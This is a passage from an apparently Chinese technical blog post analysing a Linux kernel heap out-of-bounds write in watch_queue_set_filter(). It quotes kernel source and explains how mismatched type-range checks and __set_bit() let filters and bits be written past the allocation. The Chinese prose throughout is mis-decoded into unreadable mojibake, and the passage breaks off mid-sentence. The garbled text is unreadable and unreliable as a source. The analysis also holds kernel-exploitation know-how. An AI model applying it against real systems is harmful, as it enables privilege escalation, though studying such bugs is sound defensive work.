ç¼–è¯‘é€‰é¡¹å¯ç”¨ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p><p>è¯¥æœºåˆ¶é€šè¿‡ä¸€ä¸ªä»¥ç‰¹æ®Šæ¨¡å¼æ‰“å¼€çš„ç®¡é“å®ç°ï¼Œå†…æ ¸ç”Ÿæˆçš„æ¶ˆæ¯è¢«ä¿å­˜åˆ°ç®¡é“å†…éƒ¨çš„å¾ªç¯ç¯å½¢ç¼“å†²åŒºä¸­ï¼ˆ<code>pipe_buffer</code> é˜Ÿåˆ—ï¼‰ï¼Œé€šè¿‡ <code>read()</code> è¿›è¡Œè¯»å–ï¼Œç”±äºåœ¨æŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æƒ³è¦å°†æ·»åŠ çš„å†…å®¹è¿˜åŸåˆ°ç¯ä¸Šï¼Œå› æ­¤åœ¨æ­¤ç±»ç®¡é“ä¸Šç¦ç”¨äº† splice ä»¥åŠç±»ä¼¼åŠŸèƒ½ï¼ˆå› ä¸ºè¿™å¯èƒ½å¯¼è‡´å…¶ä¸é€šçŸ¥æ¶ˆæ¯äº¤ç»‡åœ¨ä¸€èµ·ï¼‰</p><p>ç®¡é“çš„æ‰€æœ‰è€…åº”å½“å‘Šè¯‰å†…æ ¸å“ªäº›èµ„æºå…¶æƒ³è¦é€šè¿‡è¯¥ç®¡é“è¿›è¡Œè§‚å¯Ÿï¼Œåªæœ‰è¿æ¥åˆ°è¯¥ç®¡é“ä¸Šçš„èµ„æºæ‰ä¼šå¾€é‡Œè¾¹æ’å…¥æ¶ˆæ¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªèµ„æºå¯èƒ½ä¼šä¸å¤šä¸ªç®¡é“ç»‘å®šå¹¶åŒæ—¶å°†æ¶ˆæ¯æ’å…¥æ‰€æœ‰ç®¡é“</p><p>è‹¥ç¯ä¸­æ²¡æœ‰å¯ç”¨çš„æ’æ§½æˆ–å¯ç”¨çš„é¢„åˆ†é…çš„ message bufferï¼ˆä¸€ä¸ªç®¡é“é»˜è®¤åªæœ‰ 16 ä¸ª <code>pipe_buffer</code> â€”â€”å¯¹åº” 16 å¼ å†…å­˜é¡µï¼‰ï¼Œåˆ™æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œ<code>read()</code> å°†åœ¨è¯»å–å½“å‰ç¼“å†²åŒºçš„æœ€åä¸€æ¡æ¶ˆæ¯åå°† <code>WATCH_META_LOSS_NOTIFICATION</code> æ’å…¥è¾“å‡ºç¼“å†²åŒº</p><h3 id="Watch-Queueï¼ˆNotification-Outputï¼‰API">Watch Queueï¼ˆNotification Outputï¼‰API</h3><p>ä¸€ä¸ª <em>è§‚æµ‹é˜Ÿåˆ—</em> ï¼ˆwatch queueï¼‰æ˜¯ç”±ä¸€ä¸ªåº”ç”¨åˆ†é…çš„ç”¨ä»¥è®°å½•é€šçŸ¥çš„ç¼“å†²åŒºï¼Œå…¶å·¥ä½œåŸç†å®Œå…¨éšè—åœ¨ç®¡é“è®¾å¤‡é©±åŠ¨ä¸­ï¼Œä½†æœ‰å¿…è¦è·å¾—ä¸€ä¸ªå¯¹å…¶çš„å¼•ç”¨ä»¥è®¾ç½®ä¸€ä¸ªè§‚æµ‹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ API è¿›è¡Œç®¡ç†ï¼š</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>ç”±äºè§‚æµ‹é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­é€šè¿‡å®ç°ç¼“å†²åŒºçš„ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ç¤ºï¼Œç”¨æˆ·ç©ºé—´å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨ä¼ é€’è¯¥æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¯ä»¥ç”¨äºä»ç³»ç»Ÿè°ƒç”¨ä¸­æŸ¥æ‰¾æŒ‡å‘è§‚æµ‹é˜Ÿåˆ—çš„ä¸é€æ˜æŒ‡é’ˆ</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>è¯¥å‡½æ•°ç”¨ä»¥ä¸¢å¼ƒä» <code>get_watch_queue()</code> è·å¾—çš„å¼•ç”¨</p></li></ul><h3 id="Event-Filter">Event Filter</h3><p>å½“ä¸€ä¸ªè§‚æµ‹é˜Ÿåˆ—è¢«åˆ›å»ºåï¼Œæˆ‘ä»¬å¯ä»¥åº”ç”¨ä¸€ç»„ <em>è¿‡æ»¤å™¨</em> ï¼ˆfiltersï¼‰ä»¥é™åˆ¶æ¥æ”¶çš„äº‹ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span> =</span> &#123;<br>        ...<br>&#125;;<br>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ filter åº”ä¸ºä¸€ä¸ª <code>struct watch_notification_filter</code> ç±»å‹å˜é‡ï¼Œå…¶ä¸­ <code>nr_filters</code> è¡¨ç¤º <code>filters[]</code> æ•°ç»„ä¸­è¿‡æ»¤å™¨çš„æ•°é‡ï¼Œè€Œ <code>__reserved</code> åº”ä¸º 0ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> &#123;</span><br>        __u32   nr_filters;<br>        __u32   __reserved;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> <span class="hljs-title">filters</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>filters[]</code> ä¸ºä¸€ä¸ª <code>watch_notification_type_filter</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> &#123;</span><br>        __u32   type;<br>        __u32   info_filter;<br>        __u32   info_mask;<br>        __u32   subtype_filter[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>type</code> ä¸ºè¦è¿‡æ»¤çš„äº‹ä»¶ç±»å‹ï¼Œåº”å½“ä¸ºç±»ä¼¼ <code>WATCH_TYPE_KEY_NOTIFY</code> çš„å€¼</p></li><li><p><code>info_filter</code> ä¸ <code>info_mask</code> å……å½“é€šçŸ¥è®°å½•çš„ä¿¡æ¯å­—æ®µçš„è¿‡æ»¤å™¨ï¼Œä»…åœ¨ä»¥ä¸‹æƒ…å†µæ‰å°†é€šçŸ¥å†™å…¥ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(watch.info &amp; info_mask) == info_filter<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¿™å¯ä»¥ç”¨äºå¿½ç•¥ä¸åœ¨ä¸€ä¸ªæŒ‚è½½æ ‘ä¸Šçš„è§‚æµ‹ç‚¹çš„äº‹ä»¶</p></li><li><p><code>subtype_filter</code> ä¸ºä¸€ä¸ªæŒ‡ç¤ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„å­ç±»å‹çš„ bitmaskï¼Œ<code>subtype_filter[0]</code> çš„ 0 ä½å¯¹åº”å­ç±»å‹ 0ï¼Œ1 ä½å¯¹åº”å­ç±»å‹ 1ï¼Œä»¥æ­¤ç±»æ¨</p></li></ul><p>è‹¥ ioctl() çš„å‚æ•°ä¸º NULLï¼Œåˆ™è¿‡æ»¤å™¨å°†è¢«ç§»é™¤ï¼Œæˆ‘ä»¬å°†æ¥æ”¶åˆ°æ‰€æœ‰æ¥è‡ªè§‚æµ‹æºçš„äº‹ä»¶</p><h2 id="å†…æ ¸ä¸­-watch-queue-subsystem-ä¸­-Event-Filter-çš„å®ç°">å†…æ ¸ä¸­ watch queue subsystem ä¸­ Event Filter çš„å®ç°</h2><p>å‰é¢æˆ‘ä»¬æŠ„äº†ä¸€å¤§æ®µçš„ kernel documentï¼Œç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥æºç çœ‹ä¸€ä¸‹ watch queue subsystem çš„å®ç°æœºåˆ¶</p><p>å½“æˆ‘ä»¬è°ƒç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> æ—¶ï¼Œä¼šè°ƒç”¨ <code>do_vfs_ioctl()</code> åˆ¤æ–­ cmd è¿›è¡Œå¤„ç†ï¼Œè€Œæˆ‘ä»¬çš„ <code>IOC_WATCH_QUEUE_SET_FILTER</code> ä¸åœ¨å…¶åˆ—è¡¨ä¸­ï¼Œæ‰€ä»¥æœ€åä¼šèµ°åˆ° <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(ioctl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget(fd);<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>error = security_file_ioctl(f.file, cmd, arg);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br><br>error = do_vfs_ioctl(f.file, fd, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = vfs_ioctl(f.file, cmd, arg);<br><br>out:<br>fdput(f);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>vfs_ioctl()</code> ä¸­ä¼šè°ƒç”¨ file ç»“æ„ä½“è‡ªèº«çš„å‡½æ•°è¡¨ä¸­çš„ <code>unlocked_ioctl</code> æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">vfs_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">int</span> error = -ENOTTY;<br><br><span class="hljs-keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)<br><span class="hljs-keyword">goto</span> out;<br><br>error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = -ENOTTY;<br> out:<br><span class="hljs-keyword">return</span> error;<br>&#125;<br>EXPORT_SYMBOL(vfs_ioctl);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ç›®å…‰æ”¾å›ç®¡é“çš„åˆ›å»ºæµç¨‹ä¸­åˆ†é…æ–‡ä»¶æè¿°ç¬¦çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">do_pipe2()<br>    __do_pipe_flags()<br>    create_pipe_files()<br>    alloc_file_pseudo()<br>    alloc_file()<br></code></pre></td></tr></table></figure><p><code>alloc_file()</code> åˆ†é…ä¸€ä¸ª file ç»“æ„ä½“å¹¶å°†å…¶å‡½æ•°è¡¨è®¾ä¸ºä¸Šå±‚è°ƒç”¨ä¼ å…¥çš„å‡½æ•°è¡¨ï¼Œè€Œåœ¨ <code>create_pipe_files()</code> ä¸­ä¼ å…¥çš„å‡½æ•°è¡¨ä¸º <code>pipefifo_fops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å› æ­¤æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯ <code>pipe_ioctl()</code>ï¼Œå¯¹äº cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> è€Œè¨€ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ <code>watch_queue_set_filter()</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">int</span> count, head, tail, mask;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FIONREAD:<br>__pipe_lock(pipe);<br>count = <span class="hljs-number">0</span>;<br>head = pipe-&gt;head;<br>tail = pipe-&gt;tail;<br>mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">while</span> (tail != head) &#123;<br>count += pipe-&gt;bufs[tail &amp; mask].len;<br>tail++;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">return</span> put_user(count, (<span class="hljs-type">int</span> __user *)arg);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;<br><span class="hljs-type">int</span> ret;<br>__pipe_lock(pipe);<br>ret = watch_queue_set_size(pipe, arg);<br>__pipe_unlock(pipe);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:<br><span class="hljs-keyword">return</span> watch_queue_set_filter(<br>pipe, (<span class="hljs-keyword">struct</span> watch_notification_filter __user *)arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -ENOIOCTLCMD;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x01.æ¼æ´åˆ†æ</h1><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨ <code>watch_queue_set_filter()</code>ä¸­å°† filter æ•°ç»„ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´çš„è¿‡ç¨‹å½“ä¸­ï¼Œç°åœ¨è®©æˆ‘ä»¬ä»”ç»†å®¡è§†è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹ï¼Œåœ¨ä¸€å¼€å§‹æ—¶é¦–å…ˆä¼šå°†ç”¨æˆ·ç©ºé—´çš„ <code>watch_notification_filter</code> ç»“æ„æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">watch_queue_set_filter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> watch_notification_filter __user *_filter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> *<span class="hljs-title">tf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_type_filter</span> *<span class="hljs-title">q</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_filter</span> *<span class="hljs-title">wfilter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">wqueue</span> =</span> pipe-&gt;watch_queue;<br><span class="hljs-type">int</span> ret, nr_filter = <span class="hljs-number">0</span>, i;<br><br><span class="hljs-keyword">if</span> (!wqueue)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-keyword">if</span> (!_filter) &#123;<br><span class="hljs-comment">/* Remove the old filter */</span><br>wfilter = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">set</span>;<br>&#125;<br><br><span class="hljs-comment">/* Grab the user&#x27;s filter specification */</span><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="hljs-keyword">sizeof</span>(filter)) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (filter.nr_filters == <span class="hljs-number">0</span> ||<br>    filter.nr_filters &gt; <span class="hljs-number">16</span> ||<br>    filter.__reserved != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>ä¹‹å <code>memdup_user()</code> åˆ†é…ä¸€å—ä¸´æ—¶ç©ºé—´ï¼Œå°†ç”¨æˆ·ç©ºé—´çš„ filter æ•°ç»„æ‹·è´è‡³è¯¥ä¸´æ—¶ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šéå†æ¯ä¸€ä¸ª <code>watch_notification_type_filter</code> ç»“æ„ï¼Œè®°å½• type åœ¨æŒ‡å®šèŒƒå›´çš„ filter çš„æ•°é‡åˆ°å˜é‡ <code>nr_filter</code> ä¸­ï¼Œè¿™é‡Œå…¶åˆ¤æ–­ä¸€ä¸ª type æ˜¯å¦åˆæ³•çš„èŒƒå›´æ˜¯ <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = -EINVAL;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||<br>    tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br><span class="hljs-keyword">goto</span> err_filter;<br><span class="hljs-comment">/* Ignore any unknown types */</span><br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">continue</span>;<br>nr_filter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆ†é…çœŸæ­£å‚¨å­˜ filter çš„çš„ç©ºé—´ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª <code>struct_size()</code> å¯¼å‡ºçš„å¤§å°ä¸º <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>ï¼ˆæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œé˜…è¯»æºç ï¼‰ï¼Œæ³¨æ„åˆ°è¿™é‡Œè®¡ç®—å¤§å°ç”¨çš„æ˜¯æˆ‘ä»¬å‰é¢éå†è®¡ç®—å¾—åˆ°çš„ <code>nr_filter</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!wfilter)<br><span class="hljs-keyword">goto</span> err_filter;<br>wfilter-&gt;nr_filters = nr_filter;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯å°† filter æ•°ç»„æ‹·è´åˆ°åˆ†é…çš„ç©ºé—´ä¸Šï¼Œ<strong>æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ¼æ´ä¾¿å‡ºç°åœ¨è¿™é‡Œï¼Œå…¶åˆ¤æ–­ type æ˜¯å¦åˆæ³•ä½¿ç”¨çš„æ˜¯</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ï¼Œ<strong>ä¸å‰é¢ nr_filter çš„è®¡ç®—å­˜åœ¨ä¸ä¸€è‡´æ€§</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">q = wfilter-&gt;filters;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)<br><span class="hljs-keyword">continue</span>;<br><br>q-&gt;type= tf[i].type;<br>q-&gt;info_filter= tf[i].info_filter;<br>q-&gt;info_mask= tf[i].info_mask;<br>q-&gt;subtype_filter[<span class="hljs-number">0</span>]= tf[i].subtype_filter[<span class="hljs-number">0</span>];<br>__set_bit(q-&gt;type, wfilter-&gt;type_filter);<br>q++;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>BITS_PER_LONG</code> å®šä¹‰äº <code>/include/asm-generic/bitsperlong.h</code> ä¸­ï¼Œ<strong>åœ¨ 32 ä½ä¸‹ä¸º 32ï¼Œ64 ä½ä¸‹ä¸º64</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_64BIT */</span></span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå‰åå¯¹ type èŒƒå›´çš„è®¡ç®—ä¾¿å­˜åœ¨ä¸ä¸€è‡´ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‡ ä¸ª filter çš„ type ä¸ºï¼ˆè®¡ç®— nr_filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼Œæ‹·è´ filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼‰è¿™ä¸ªèŒƒå›´å†…çš„ç‰¹å®šå€¼ï¼Œè¿™æ ·å°±èƒ½è¶Šç•Œæ‹·è´ä¸€å®šæ•°é‡çš„ filterï¼Œä»è€Œå®Œæˆå †ä¸Šçš„è¶Šç•Œå†™</strong></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å®¹æ˜“è®¡ç®—å¾—å‡ºè§¦å‘ç¬¬ä¸€ä¸ªæ¼æ´çš„ type çš„èŒƒå›´åº”ä¸º <code>[0x80, 0x400)</code></p><p>è€Œ<strong>ç¬¬äºŒä¸ªæ¼æ´åˆ™å­˜åœ¨äºä¸Šé¢è¿™æ®µä»£ç ä¸­å¯¹</strong> <code>__set_bit()</code> <strong>çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __set_bit(<span class="hljs-type">int</span> nr, <span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *addr)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mask = BIT_MASK(nr);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)addr) + BIT_WORD(nr);<br><br>*p  |= mask;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä½œç”¨ä¾¿æ˜¯<strong>å°† addr åç§» BIT_WORD(nr) å¤„çš„ BIT_MASK(mask) ä½è¿›è¡Œç½® 1 